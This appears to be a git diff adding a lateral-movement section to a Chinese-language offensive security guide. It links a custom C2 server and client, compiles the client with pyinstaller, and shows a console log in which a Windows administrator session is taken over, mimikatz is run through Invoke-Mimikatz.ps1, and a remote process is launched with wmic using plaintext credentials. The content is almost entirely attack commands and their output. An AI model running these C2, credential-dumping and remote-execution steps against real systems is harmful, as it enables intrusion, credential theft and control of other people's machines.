@@ -163,3 +163,51 @@ C2> Session 2 connected
 
 C2> exec whoami /priv
 ```
+
+### 横向移动
+
+[LM_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/LM_server.py)
+
+[LM_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/tree/main/Zh/%E7%AC%AC%E4%B8%83%E7%AB%A0/C2%E5%A4%9A%E9%98%B6%E6%AE%B5%E6%94%BB%E5%87%BB/LM_client.py)
+
+```bash
+pyinstaller.exe --onefile .\LM_client.py
+```
+
+```bash
+┌──(crypto)─(root㉿kali)-[~/c2]
+└─# python3 LM_server.py
+C2 Console running...
+C2> Session 1 connected
+Raw message from session 1: {"system": "Windows", "user": "administrator"}
+
+C2> sessions
++------------+---------+---------------+---------------+
+| Session ID | System  |  IP Address   |     User      |
++------------+---------+---------------+---------------+
+|     1      | Windows | 192.168.0.109 | administrator |
++------------+---------+---------------+---------------+
+C2> set session 1
+Session 1 selected
+C2> use mimikatz
+Module mimikatz loaded
+C2> show options
+{
+    "script_path": "C:\\Users\\Administrator\\Desktop\\test\\c2\\Invoke-Mimikatz.ps1"
+}
+C2> exploit
+Exploit command sent to session 1
+C2> Raw message from session 1: {"result": "CiAgLiM......"
+C2> exec wmic /node:192.168.0.109 /user:Administrator /password:123qwe!@# process call create "cmd.exe /c ipconfig"
+Command sent to session 1
+C2> Raw message from session 1: {"result": "5omn6KGMKFdpbjMyX1Byb2Nlc3MpLT5DcmVhdGUoKQoK5pa55rOV5omn6KGM5oiQ5Yqf44CCCgrlpJblj4LmlbA6Cmluc3RhbmNlIG9mIF9fUEFSQU1FVEVSUwp7CglQcm9jZXNzSWQgPSAzODM2OwoJUmV0dXJuVmFsdWUgPSAwOwp9OwoK"}
+Received from session 1: 执行(Win32_Process)->Create()
+
+方法执行成功。
+外参数:
+instance of __PARAMETERS
+{
+        ProcessId = 3836;
+        ReturnValue = 0;
+};
+```
